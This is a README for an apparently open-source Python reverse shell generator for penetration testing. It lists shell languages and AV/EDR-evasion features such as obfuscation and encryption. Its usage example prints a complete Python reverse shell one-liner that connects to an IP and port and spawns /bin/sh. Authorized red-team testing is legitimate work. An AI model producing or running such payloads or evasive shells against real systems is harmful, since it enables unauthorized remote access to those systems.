# README for Reverse Shell Generator

## Overview
This tool is a versatile reverse shell generator designed to assist cybersecurity professionals and ethical hackers in setting up reverse shells for penetration testing and red teaming activities. It supports multiple languages and includes features like Base64 encoding, shell obfuscation, and encryption to bypass security measures.

## Features
- **Multiple Reverse Shell Languages**: Supports Bash, Python, PHP, Perl, Ruby, PowerShell, Netcat, UDP Bash, HTTP Python, and ICMP Python.
- **Base64 Encoding**: Encodes the generated shell for easy transfer.
- **Shell Obfuscation**: Obfuscates the shell to bypass basic AV/EDR systems.
- **Encryption**: Encrypts the shell payload using AES or RSA encryption.
- **TTY Shell Upgrade**: Provides commands to upgrade the shell to a TTY shell.
- **Listener Setup**: Automatically sets up a listener using Metasploit or Netcat.

## Installation
1. Clone the repository:
   ```bash
   git clone https://github.com/S2K7x/revshell.py
   cd reverse-shell-generator
   ```

2. Install the required dependencies (if any):
   ```bash
   pip install -r requirements.txt
   ```

## Usage
1. Run the script:
   ```bash
   python revshell.py
   ```

2. Follow the on-screen instructions to generate a reverse shell.

### Example
```bash
[*] Detected local OS: Linux

[*] Enter target IP: 192.168.1.100
[*] Enter target port: 4444

Available reverse shells:
1. bash
2. python
3. php
4. perl
5. ruby
6. powershell
7. nc
8. udp_bash
9. http_python
10. icmp_python

[*] Enter the reverse shell language/type (number): 2
[*] Do you want to Base64 encode the shell? (y/n): y
[*] Do you want to obfuscate the shell? (y/n): n
[*] Do you want to encrypt the shell communication (AES/RSA)? (aes/rsa/none): none

[+] Generated Reverse Shell for python:

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'

[*] Generate another reverse shell? (y/n): n
[*] Exiting...
```

## Configuration
- **Encryption**: The tool supports AES and RSA encryption. For RSA, ensure you have the `public_key.pem` file in the same directory.
- **Listener**: The tool uses Metasploit for setting up listeners. Ensure Metasploit is installed and properly configured.

## Dependencies
- Python 3.x
- Metasploit Framework (for listener setup)
- OpenSSL (for encryption)

## Contributing
Contributions are welcome! Please open an issue or submit a pull request.

## License
This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Disclaimer
This tool is intended for educational and ethical hacking purposes only. Unauthorized access to computer systems is illegal. Use this tool responsibly and only on systems you own or have explicit permission to test.

---

Thank you for using the Reverse Shell Generator! If you have any questions or need further assistance, please don't hesitate to contact us.
